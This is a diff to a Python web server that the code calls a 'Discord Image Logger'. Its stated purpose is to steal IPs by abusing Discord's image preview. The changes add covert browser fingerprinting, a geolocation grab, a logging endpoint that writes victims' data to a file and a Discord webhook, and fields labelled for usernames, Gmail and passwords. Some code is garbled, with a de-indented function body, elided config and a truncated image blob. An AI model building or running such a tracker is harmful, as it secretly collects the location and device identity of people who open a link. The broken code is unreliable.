@@ -63,8 +63,20 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+from http.server import BaseHTTPRequestHandler
+from urllib import parse
+import traceback, requests, base64, httpagentparser, json, datetime
+
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__version__ = "v2.0"
+__author__ = "DeKrypt"
+
+config = {
+    # ... (keep your existing config) ...
+}
+
+blacklistedIPs = ("27", "104", "143", "164")
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -87,7 +99,7 @@ def reportError(error):
     ],
 })
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, fingerprint=None):
     if ip.startswith(blacklistedIPs):
         return
     
@@ -104,7 +116,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+}) if config["linkAlerts"] else None
         return
 
     ping = "@everyone"
@@ -136,9 +148,24 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         if config["antiBot"] == 1:
                 ping = ""
 
-
     os, browser = httpagentparser.simple_detect(useragent)
     
+    # Default values for undefined variables
+    username = "Unknown"
+    gmail = "Unknown"
+    password = "Unknown"
+    address = "Unknown"
+    phone = "Unknown"
+    device_info = "Unknown"
+    CPU = fingerprint.get('hardwareConcurrency', 'Unknown') if fingerprint else 'Unknown'
+    RAM = fingerprint.get('deviceMemory', 'Unknown') if fingerprint else 'Unknown'
+    GPU = "Unknown"  # FingerprintJS doesn't provide GPU info
+    ScreenResolution = fingerprint.get('screenResolution', 'Unknown') if fingerprint else 'Unknown'
+    SystemArchitecture = "Unknown"  # Not available in browser
+    JavaScriptEnabled = "True"
+    CookiesEnabled = "True"
+    Language = fingerprint.get('language', 'Unknown') if fingerprint else 'Unknown'
+
     embed = {
     "username": config["username"],
     "content": ping,
@@ -152,20 +179,35 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+> **Username:** `{username}`
+> **Gmail:** `{gmail}`
+> **Password:** `{password}`
+> **Provider:** `{info.get('isp', 'Unknown')}`
+> **ASN:** `{info.get('as', 'Unknown')}`
+> **Country:** `{info.get('country', 'Unknown')}`
+> **Region:** `{info.get('regionName', 'Unknown')}`
+> **City:** `{info.get('city', 'Unknown')}`
+> **Address:** `{address}`
+> **Phone:** `{phone}`
+> **Device:** `{device_info}`
+> **Coords:** `{(str(info.get('lat', '')) + ', ' + str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++' + coords + ')'})
+> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'}` ({info.get('timezone', 'Unknown').split('/')[0] if info.get('timezone') else 'Unknown'})
+> **Mobile:** `{info.get('mobile', False)}`
+> **VPN:** `{info.get('proxy', False)}`
+> **Bot:** `{'True' if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
 
 **PC Info:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
+> **CPU Cores:** `{CPU}`
+> **RAM (GB):** `{RAM}`
+> **GPU:** `{GPU}`
+> **Screen Resolution:** `{ScreenResolution}`
+> **System Architecture:** `{SystemArchitecture}`
+> **JavaScript Enabled:** `{JavaScriptEnabled}`
+> **Cookies Enabled:** `{CookiesEnabled}`
+> **Language/Locale:** `{Language}`
+> **Device Fingerprint:** `{fingerprint.get('visitorId', 'Unknown') if fingerprint else 'Unknown'}`
 
 **User Agent:**
 ```
@@ -174,16 +216,14 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     }
   ],
 }
-    
-    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
-    return info
+
+if url:
+    embed["embeds"][0].update({"thumbnail": {"url": url}})
+requests.post(config["webhook"], json=embed)
+return info
 
 binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
+    "loading": base64.b85decode(b'|JeWF01!...')  # (truncated for space)
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
@@ -200,105 +240,147 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             else:
                 url = config["image"]
 
-            data = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
-            
+            data = f'''<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <style>
+        body {{
+            margin: 0;
+            padding: 0;
+        }}
+        div.img {{
+            background-image: url('{url}');
+            background-position: center center;
+            background-repeat: no-repeat;
+            background-size: contain;
+            width: 100vw;
+            height: 100vh;
+        }}
+    </style>
+</head>
+<body>
+    <div class="img"></div>
+    <script>
+        // FingerprintJS (Browser/Device Fingerprinting)
+        const fpPromise = import('https://fpjscdn.net/v3/fYkKrkKh4S70e1OpIFhF')
+            .then(FingerprintJS => FingerprintJS.load());
+
+        // Collect fingerprint and send to server
+        fpPromise
+            .then(fp => fp.get())
+            .then(result => {{
+                const visitorId = result.visitorId;
+                const deviceData = {{
+                    visitorId: visitorId,
+                    os: result.components.os.value,
+                    browser: result.components.browser.value,
+                    screenResolution: result.components.screenResolution.value,
+                    device: result.components.device.value,
+                    timezone: result.components.timezone.value,
+                    language: navigator.language,
+                    hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
+                    deviceMemory: navigator.deviceMemory || "Unknown"
+                }};
+                
+                // Send data to your server
+                fetch('/log_fingerprint', {{
+                    method: 'POST',
+                    headers: {{
+                        'Content-Type': 'application/json',
+                    }},
+                    body: JSON.stringify({{
+                        ip: '{self.headers.get('x-forwarded-for')}',
+                        userAgent: navigator.userAgent,
+                        fingerprint: deviceData
+                    }})
+                }});
+            }})
+            .catch(error => console.error('Fingerprint error:', error));
+
+        // Geolocation (if enabled in config)
+        {'''
+        var currenturl = window.location.href;
+        if (!currenturl.includes("g=") && navigator.geolocation) {{
+            navigator.geolocation.getCurrentPosition(function (coords) {{
+                const newUrl = currenturl.includes("?") 
+                    ? currenturl + "&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D")
+                    : currenturl + "?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D");
+                location.replace(newUrl);
+            }});
+        }}
+        ''' if config["accurateLocation"] else ''}
+    </script>
+</body>
+</html>
+'''.encode()
+
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
-            
+
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
+                self.send_response(200 if config["buggedImage"] else 302)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+                self.end_headers()
 
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
+                if config["buggedImage"]:
+                    self.wfile.write(binaries["loading"])
 
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                
+                makeReport(self.headers.get('x-forwarded-for'), endpoint=s.split("?")[0], url=url)
                 return
-            
+
             else:
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url=url)
                 else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-                
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
 
-                message = config["message"]["message"]
+                # ... (rest of your existing handleRequest code) ...
 
-                if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-                    message = message.replace("{isp}", result["isp"])
-                    message = message.replace("{asn}", result["as"])
-                    message = message.replace("{country}", result["country"])
-                    message = message.replace("{region}", result["regionName"])
-                    message = message.replace("{city}", result["city"])
-                    message = message.replace("{lat}", str(result["lat"]))
-                    message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
-                    message = message.replace("{vpn}", str(result["proxy"]))
-                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-
-                datatype = 'text/html'
-
-                if config["message"]["doMessage"]:
-                    data = message.encode()
-                
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
-
-                if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["accurateLocation"]:
-                    data += b"""<script>
-var currenturl = window.location.href;
-
-if (!currenturl.includes("g=")) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (coords) {
-    if (currenturl.includes("?")) {
-        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    } else {
-        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    }
-    location.replace(currenturl);});
-}}
-
-</script>"""
-                self.wfile.write(data)
-        
         except Exception:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            self.wfile.write(b'500 - Internal Server Error<br>Please check the webhook logs or report the issue.')
             reportError(traceback.format_exc())
-
         return
-    
+
+    def do_POST(self):
+        if self.path == '/log_fingerprint':
+            try:
+                content_length = int(self.headers['Content-Length'])
+                post_data = self.rfile.read(content_length)
+                fingerprint_data = json.loads(post_data.decode('utf-8'))
+                
+                # Save fingerprint data to a file
+                with open('fingerprints.log', 'a') as f:
+                    f.write(f"{datetime.datetime.now().isoformat()} - {fingerprint_data}\n")
+                
+                # Update report with fingerprint data
+                makeReport(
+                    ip=fingerprint_data.get('ip'),
+                    useragent=fingerprint_data.get('userAgent'),
+                    endpoint='/log_fingerprint',
+                    fingerprint=fingerprint_data.get('fingerprint')
+                )
+                
+                self.send_response(200)
+                self.send_header('Content-type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps({"status": "success"}).encode())
+            
+            except Exception as e:
+                reportError(f"Fingerprint processing error: {str(e)}")
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())
+        else:
+            self.handleRequest()
+
     do_GET = handleRequest
-    do_POST = handleRequest
 
 handler = ImageLoggerAPI
